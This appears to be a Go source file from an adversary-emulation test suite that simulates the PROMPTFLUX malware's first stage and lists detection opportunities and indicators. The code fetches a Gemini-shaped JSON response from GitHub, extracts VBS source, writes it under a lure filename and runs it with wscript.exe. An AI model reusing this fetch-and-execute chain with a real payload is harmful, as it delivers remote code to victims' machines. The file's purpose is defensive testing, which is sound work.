//go:build windows
// +build windows

/*
STAGE 1: Application Layer Protocol — Web Protocols (T1071.001)

Simulates PROMPTFLUX's runtime LLM fetch: HTTPS GET to raw.githubusercontent.com
for a Gemini-shaped JSON response envelope, extracts the obfuscated VBS source
from candidates[0].content.parts[0].text, writes it to c:\F0\crypted_ScreenRec_webinstall.vbs
(the GTIG-documented lure filename), writes the raw LLM response to
%TEMP%\thinking_robot_log.txt (GTIG-documented staging log), and invokes
wscript.exe on the staged VBS. The VBS is benign and only echoes a marker
and drops a marker file.

Detection opportunities:
  - Non-browser process issuing HTTPS GET to raw.githubusercontent.com
  - DNS EventID 22 for raw.githubusercontent.com from a binary in c:\F0
  - TLS ClientHello with SNI raw.githubusercontent.com from non-browser UA
  - Write of VBS file to c:\F0 by non-Office, non-browser process
  - wscript.exe child process of an unsigned binary in c:\F0
  - Write to %TEMP%\thinking_robot_log.txt (exact GTIG PROMPTFLUX IOC)
*/

package main

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

// v1.1: hard cap on the wscript.exe child process. The benign VBS body is
// file-only (no Echo / no MessageBox), but a defence-in-depth timeout
// protects against any future Session-0 hang regression.
const wscriptExecTimeout = 30 * time.Second

const (
	TEST_UUID      = "0a749b39-409e-46f5-9338-ee886b439cfa"
	TECHNIQUE_ID   = "T1071.001"
	TECHNIQUE_NAME = "LLM API Fetch — GitHub-Raw GET"
	STAGE_ID       = 1

	STAGE1_LLM_RESPONSE_URL = "https://raw.githubusercontent.com/projectachilles/ProjectAchilles/main/lab-assets/promptflux/v1/gemini_response.json"

	// GTIG-documented lure filename.
	VBS_DROP_PATH = `c:\F0\crypted_ScreenRec_webinstall.vbs`

	// Network log for observability / detection-rule validation.
	NETWORK_LOG = `c:\F0\stage1_network.log`

	// GTIG-documented Thinging trail artefact.
	THINKING_LOG_NAME = "thinking_robot_log.txt"
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, "Starting PROMPTFLUX stage-1 (Gemini-shaped HTTPS GET + wscript staging)")
	LogStageStart(STAGE_ID, TECHNIQUE_ID,
		"HTTPS GET to raw.githubusercontent.com for Gemini-shaped envelope; extract VBS; wscript.exe")

	if err := performTechnique(); err != nil {
		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))

		exitCode := determineExitCode(err)
		if exitCode == StageBlocked || exitCode == StageQuarantined {
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
		} else {
			LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		}
		os.Exit(exitCode)
	}

	fmt.Printf("[STAGE %s] LLM fetch + wscript staging complete; VBS at %s\n", TECHNIQUE_ID, VBS_DROP_PATH)
	LogMessage("SUCCESS", TECHNIQUE_ID, "Stage-1 VBS fetched, staged and executed")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success",
		"HTTPS GET succeeded; VBS written to c:\\F0; wscript.exe invoked; marker file created")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	if err := os.MkdirAll(filepath.Dir(VBS_DROP_PATH), 0755); err != nil {
		return fmt.Errorf("log dir creation: %v", err)
	}

	netLog, logErr := os.OpenFile(NETWORK_LOG, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if logErr != nil {
		LogMessage("WARN", TECHNIQUE_ID, fmt.Sprintf("Could not open network log %s: %v", NETWORK_LOG, logErr))
	}
	if netLog != nil {
		defer netLog.Close()
		fmt.Fprintf(netLog, "[%s] stage1 start; target_url=%s\n",
			time.Now().UTC().Format(time.RFC3339), STAGE1_LLM_RESPONSE_URL)
	}

	// Real TLS handshake against GitHub's fleet cert — no pinning.
	client := &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{MinVersion: tls.VersionTLS12},
		},
	}

	req, err := http.NewRequest("GET", STAGE1_LLM_RESPONSE_URL, nil)
	if err != nil {
		return fmt.Errorf("http request build: %v", err)
	}
	// PROMPTFLUX-shaped UA — visible string IOC for YARA/Sigma.
	req.Header.Set("User-Agent", "PromptfluxClient/1.0 (simulated)")
	req.Header.Set("Accept", "application/json")

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Issuing HTTPS GET to %s", STAGE1_LLM_RESPONSE_URL))
	if netLog != nil {
		fmt.Fprintf(netLog, "[%s] GET %s (UA=PromptfluxClient/1.0)\n",
			time.Now().UTC().Format(time.RFC3339), STAGE1_LLM_RESPONSE_URL)
	}

	startTime := time.Now()
	resp, err := client.Do(req)
	fetchDuration := time.Since(startTime)

	if err != nil {
		if netLog != nil {
			fmt.Fprintf(netLog, "[%s] GET failed after %v: %v\n",
				time.Now().UTC().Format(time.RFC3339), fetchDuration, err)
		}
		// Asset unreachable = environmental (999), NOT blocked (126).
		return fmt.Errorf("https get to github raw unavailable: %v", err)
	}
	defer resp.Body.Close()

	if netLog != nil {
		tlsVer := "unknown"
		peerName := "unknown"
		if resp.TLS != nil {
			switch resp.TLS.Version {
			case tls.VersionTLS12:
				tlsVer = "TLS 1.2"
			case tls.VersionTLS13:
				tlsVer = "TLS 1.3"
			}
			if len(resp.TLS.PeerCertificates) > 0 {
				peerName = resp.TLS.PeerCertificates[0].Subject.CommonName
			}
		}
		fmt.Fprintf(netLog, "[%s] response: status=%d tls=%s peer_cn=%q duration=%v\n",
			time.Now().UTC().Format(time.RFC3339), resp.StatusCode, tlsVer, peerName, fetchDuration)
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("github raw returned non-200 status: %d (lab asset may not be uploaded)", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("response body read: %v", err)
	}
	if netLog != nil {
		fmt.Fprintf(netLog, "[%s] response body size=%d bytes\n",
			time.Now().UTC().Format(time.RFC3339), len(body))
	}

	// Write the raw LLM response to %TEMP%\thinking_robot_log.txt — exact
	// GTIG-documented PROMPTFLUX IOC (T1074.001: Local Data Staging).
	if tmp := os.Getenv("TEMP"); tmp != "" {
		thinkingPath := filepath.Join(tmp, THINKING_LOG_NAME)
		if err := os.WriteFile(thinkingPath, body, 0644); err != nil {
			LogMessage("WARN", TECHNIQUE_ID, fmt.Sprintf("thinking log write: %v", err))
		} else {
			LogFileDropped(THINKING_LOG_NAME, thinkingPath, int64(len(body)), false)
			LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Thinging log staged: %s", thinkingPath))
		}
	}

	var parsed struct {
		Candidates []struct {
			Content struct {
				Parts []struct {
					Text string `json:"text"`
				} `json:"parts"`
			} `json:"content"`
		} `json:"candidates"`
	}
	if err := json.Unmarshal(body, &parsed); err != nil {
		return fmt.Errorf("json decode of llm response: %v", err)
	}
	if len(parsed.Candidates) == 0 || len(parsed.Candidates[0].Content.Parts) == 0 {
		return fmt.Errorf("llm response missing candidates[0].content.parts[0]")
	}
	vbsSource := parsed.Candidates[0].Content.Parts[0].Text
	if len(vbsSource) < 40 {
		return fmt.Errorf("extracted VBS source too short (%d bytes) - lab asset malformed?", len(vbsSource))
	}

	// Write the VBS to the GTIG-documented path.
	if err := os.WriteFile(VBS_DROP_PATH, []byte(vbsSource), 0644); err != nil {
		return fmt.Errorf("vbs write: %v", err)
	}
	LogFileDropped("crypted_ScreenRec_webinstall.vbs", VBS_DROP_PATH, int64(len(vbsSource)), false)

	// Rule 3: os.Stat quarantine check.
	time.Sleep(1500 * time.Millisecond)
	if _, err := os.Stat(VBS_DROP_PATH); os.IsNotExist(err) {
		return fmt.Errorf("vbs file quarantined after write")
	}

	// Invoke wscript.exe on the dropped VBS. v1.1: payload is file-only
	// (creates a marker file under c:\F0). 30s hard timeout — any hang
	// kills wscript and bubbles up as a test-infra error (999).
	wscriptOut := `c:\F0\stage1_wscript_output.txt`
	wscriptCtx, wscriptCancel := context.WithTimeout(context.Background(), wscriptExecTimeout)
	defer wscriptCancel()
	cmd := exec.CommandContext(wscriptCtx, "wscript.exe", "//Nologo", VBS_DROP_PATH)

	if outFile, err := os.Create(wscriptOut); err == nil {
		defer outFile.Close()
		cmd.Stdout = outFile
		cmd.Stderr = outFile
	}

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Invoking wscript.exe on %s (timeout=%v)", VBS_DROP_PATH, wscriptExecTimeout))
	if netLog != nil {
		fmt.Fprintf(netLog, "[%s] exec: wscript.exe //Nologo %s (timeout=%v)\n",
			time.Now().UTC().Format(time.RFC3339), VBS_DROP_PATH, wscriptExecTimeout)
	}

	if err := cmd.Run(); err != nil {
		if wscriptCtx.Err() == context.DeadlineExceeded {
			return fmt.Errorf("wscript.exe timed out after %v on %s — killed by stage (test-infra failure)", wscriptExecTimeout, VBS_DROP_PATH)
		}
		return fmt.Errorf("wscript.exe run: %v", err)
	}

	// Confirm the VBS ran to completion by checking for its marker.
	markerPath := `c:\F0\promptflux_stage1_marker.txt`
	time.Sleep(500 * time.Millisecond)
	if _, err := os.Stat(markerPath); os.IsNotExist(err) {
		return fmt.Errorf("stage-1 VBS marker not produced: %s", markerPath)
	}

	LogFileDropped("promptflux_stage1_marker.txt", markerPath, 0, false)
	LogMessage("INFO", TECHNIQUE_ID, "Stage-1 VBS executed; marker file present")

	if netLog != nil {
		fmt.Fprintf(netLog, "[%s] stage1 complete: vbs=%s marker=%s\n",
			time.Now().UTC().Format(time.RFC3339), VBS_DROP_PATH, markerPath)
	}

	return nil
}

// ==============================================================================
// EXIT CODE — blame-free (Rule 1)
// ==============================================================================

func determineExitCode(err error) int {
	if err == nil {
		return StageSuccess
	}
	errStr := err.Error()
	if containsAny(errStr, []string{"access denied", "access is denied", "permission denied", "operation not permitted"}) {
		return StageBlocked
	}
	if containsAny(errStr, []string{"quarantined", "virus", "threat"}) {
		return StageQuarantined
	}
	if containsAny(errStr, []string{"not found", "does not exist", "no such", "not running", "not available", "unavailable", "unreachable", "no such host"}) {
		return StageError
	}
	return StageError
}

func containsAny(s string, substrings []string) bool {
	for _, substr := range substrings {
		if containsCI(s, substr) {
			return true
		}
	}
	return false
}

func containsCI(s, substr string) bool {
	return len(s) >= len(substr) && indexIgnoreCase(s, substr) >= 0
}

func indexIgnoreCase(s, substr string) int {
	s = toLowerStr(s)
	substr = toLowerStr(substr)
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}

func toLowerStr(s string) string {
	result := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c = c + ('a' - 'A')
		}
		result[i] = c
	}
	return string(result)
}
